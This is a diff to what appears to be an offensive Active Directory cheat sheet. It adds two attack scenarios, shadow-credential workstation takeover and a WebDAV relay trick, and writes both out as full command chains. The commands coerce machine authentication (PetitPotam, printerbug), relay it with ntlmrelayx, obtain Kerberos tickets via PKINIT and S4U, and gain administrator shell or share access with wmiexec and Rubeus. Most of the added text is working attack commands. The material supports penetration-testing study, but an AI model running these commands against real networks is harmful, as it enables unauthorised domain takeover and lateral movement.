@@ -69,6 +69,7 @@
       - [Ghost Potato - CVE-2019-1384](#ghost-potato---cve-2019-1384)
       - [RemotePotato0 DCOM DCE RPC relay](#remotepotato0-dcom-dce-rpc-relay)
       - [DNS Poisonning - Relay delegation with mitm6](#dns-poisonning---relay-delegation-with-mitm6)
+      - [Relaying with WebDav Trick](#relaying-with-webdav-trick)
     - [Active Directory Certificate Services](#active-directory-certificate-services)
       - [ESC1 - Misconfigured Certificate Templates](#esc1---misconfigured-certificate-templates)
       - [ESC2 - Misconfigured Certificate Templates](#esc2---misconfigured-certificate-templates)
@@ -1636,11 +1637,32 @@ C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproa
   ```
 
 **Scenario**:
-- Trigger an NTLM authentication from `DC01` (PetitPotam)
-- Relay it to `DC02` (ntlmrelayx)
-- Edit `DC01`'s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)
-- Alternatively : `ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'`
 
+- Scenario: Shadow Credential relaying
+  - Trigger an NTLM authentication from `DC01` (PetitPotam)
+  - Relay it to `DC02` (ntlmrelayx)
+  - Edit `DC01`'s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)
+  - Alternatively : `ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'`
+- Scenario: Workstation Takeover with RBCD
+  ```ps1
+  # Only for C2: Add Reverse Port Forward from 8081 to Team Server 81
+
+  # Set up ntlmrelayx to relay authentication from target workstation to DC 
+  proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\$ --http-port 81
+
+  # Execute printer bug to trigger authentication from target workstation 
+  proxychains python3 printerbug.py ez.lab/matt:Password1\!@ws2.ez.lab ws1@8081/file
+
+  # Get a TGT using the newly acquired certificate via PKINIT 
+  proxychains python3 gettgtpkinit.py ez.lab/ws2\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR
+
+  # Get a TGS for the target account 
+  proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v
+
+  # Utilize the TGS for future activity 
+  export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
+  proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
+  ```
 
 ### Pass-the-Hash
 
@@ -1993,6 +2015,27 @@ getST.py -spn cifs/target.lab.local lab.local/GENERATED\$ -impersonate Administr
 export KRB5CCNAME=administrator.ccache  
 secretsdump.py -k -no-pass target.lab.local  
 ```
+
+#### Relaying with WebDav Trick
+
+> Example of exploitation where you can coerce machine accounts to authenticate to a host annd combine it with Resource Based Constrained Delegation to gain elevated access.
+
+**Requirement**:
+*  WebClient service
+
+**Exploitation**:
+* Disable HTTP in Responder: `sudo vi /usr/share/responder/Responder.conf`
+* Generate a Windows machine name: `sudo responder -I eth0`, e.g: WIN-UBNW4FI3AP0
+* Prepare for RBCD against the DC: `python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support`
+* Discover WebDAV using [GetWebDAVStatus](https://github.com/G0ldenGunSec/GetWebDAVStatus): `GetWebDAVStatus.exe 10.0.0.4`
+* Trigger the authentication to relay to our nltmrelayx: `PetitPotam.exe WIN-UBNW4FI3AP0@80/pentestlab 10.0.0.4`
+* Use the created account to ask for a service ticket: 
+    ```ps1
+    .\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'
+    .\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt
+    ls \\PC1.purple.lab\c$
+    # IP of PC1: 10.0.0.4
+    ```
 
 
 ### Active Directory Certificate Services
@@ -3172,3 +3215,5 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021](https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/)
 * [NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021](https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)
 * [UnPAC the hash - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash)
+* [Lateral Movement – WebClient](https://pentestlab.blog/2021/10/20/lateral-movement-webclient/)
+* [Shadow Credentials: Workstation Takeover Edition - Matthew Creel](https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition)
